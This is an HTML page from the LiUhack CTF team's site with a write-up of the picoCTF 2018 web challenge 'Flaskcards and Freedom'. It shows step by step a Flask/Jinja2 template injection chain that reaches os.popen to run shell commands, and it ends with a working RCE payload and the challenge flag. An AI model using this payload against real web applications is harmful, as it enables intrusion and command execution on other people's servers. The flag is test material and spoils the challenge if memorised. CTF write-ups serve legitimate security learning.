@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html>
+
+    <head>
+        <title>  &middot; LiUhack - CTF team at LiU </title>
+
+        <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.51" />
+
+
+<script   src="https://code.jquery.com/jquery-3.1.1.min.js"   integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="   crossorigin="anonymous"></script>
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+
+<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+
+
+<link rel="stylesheet" href="https://liuhack.github.io/css/nix.css">
+
+
+<link href="https://fonts.googleapis.com/css?family=Inconsolata%7COpen+Sans%7CConcert+One" rel="stylesheet">
+
+
+
+
+    </head>
+
+    <body>
+	
+        <header>
+<nav class="navbar navbar-default navbar-fixed-top navbar-inverse font-header">
+	<div class="container-fluid">
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-collapse-1" aria-expanded="false">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			<a class="navbar-brand" id="green-terminal" href=https://liuhack.github.io>LiUhack@LiUhack.se ~ $</a>
+		</div>
+
+		
+		<div class="collapse navbar-collapse" id="navbar-collapse-1">
+			<ul class="nav navbar-nav navbar-right">
+				<li>
+					<a href="https://liuhack.github.io">/home/LiUhack</a>
+				</li>
+				
+				
+				<li class="dropdown">
+                    
+            		<a href="https://liuhack.github.io/writeups">~/writeups</a>
+            		
+        		</li>
+        		
+
+			</ul>
+		</div>
+	</div>
+</nav>
+</header>
+
+        <div class="container wrapper">
+            <h1><a href="https://liuhack.github.io/writeups/2018/picoctf/flaskcards_and_freedom/readme/"></a></h1>
+            <span class="post-date">Jan 1, 0001 </span>
+            <div class="post-content">
+                
+
+<h1 id="flaskcards-and-freedom-web">Flaskcards and Freedom - Web</h1>
+
+<p>From the hints on this challenge, we need to get RCE and we can get that by template injection.</p>
+
+<p>First we run</p>
+
+<pre><code>g.__class__
+</code></pre>
+
+<p>This returns a class object:
+&gt; <class 'flask.ctx._AppCtxGlobals'></p>
+
+<p>Then we do:</p>
+
+<pre><code>g.__class__.__mro__
+</code></pre>
+
+<p>This returns a list of classes that <code>g.__class__</code> is inheriting from(mro stands for Method Resolution Order)
+&gt; (<class 'flask.ctx._AppCtxGlobals'>, <class 'object'>)</p>
+
+<p>Then we need the second index there which will be [1]. After that we do:</p>
+
+<pre><code>g.__class__.__mro__[1].__subclasses__()
+</code></pre>
+
+<p>which will return a list of classes that inherit from <code>&lt;class 'object'&gt;</code>
+&gt;[<class 'itertools.compress'>, <class 'formatteriterator'>, <class 'logging.Filter'>, &hellip;]</p>
+
+<p>Then we choose for example index 14 which is a dummy class (just a normal class we can use, we could have used most other classes). By running this command:</p>
+
+<pre><code>g.__class__.__mro__[1].__subclasses__()[14]
+</code></pre>
+
+<p>We get
+&gt;<class 'tarfile.TarIter'></p>
+
+<p>Then we run:</p>
+
+<pre><code>g.__class__.__mro__[1].__subclasses__()[14].__init__
+</code></pre>
+
+<p>which will return a function that creates a new tarfile object
+&gt;<function TarIter.__init__ at 0x7fd68213fb70></p>
+
+<p>After that, we run this command:</p>
+
+<pre><code>g.__class__.__mro__[1].__subclasses__()[14].__init__.__globals__
+</code></pre>
+
+<p>which will return a list of all globals functions available in the user&rsquo;s scope
+&gt; {&lsquo;TarFile&rsquo;: <class 'tarfile.TarFile'>, &lsquo;open&rsquo;: <bound method TarFile.open of <class 'tarfile.TarFile'>&gt;, &hellip;</p>
+
+<p>Then we need to choose the sys module from the result above because the sys module contains the os module which we can use to open a file in Python. Once we have chosen the os module, we can use the popen and read function to read the flag file. The final command looks like this:</p>
+
+<pre><code>{{ g.__class__.__mro__[1].__subclasses__()[14].__init__.__globals__['sys'].modules['os'].popen(&quot;cat flag&quot;).read() }}
+</code></pre>
+
+<p>This gives us the flag: picoCTF{R_C_E_wont_let_me_be_04eedee8}</p>
+
+            </div>
+            
+            <div class="post-comments">
+                
+            </div>
+            
+            <div class="push"></div>
+        </div>
+        <footer class="footer text-center">
+<p>Copyright &copy; 2019 LiUhack
+</p>
+</footer>
+
+    </body>
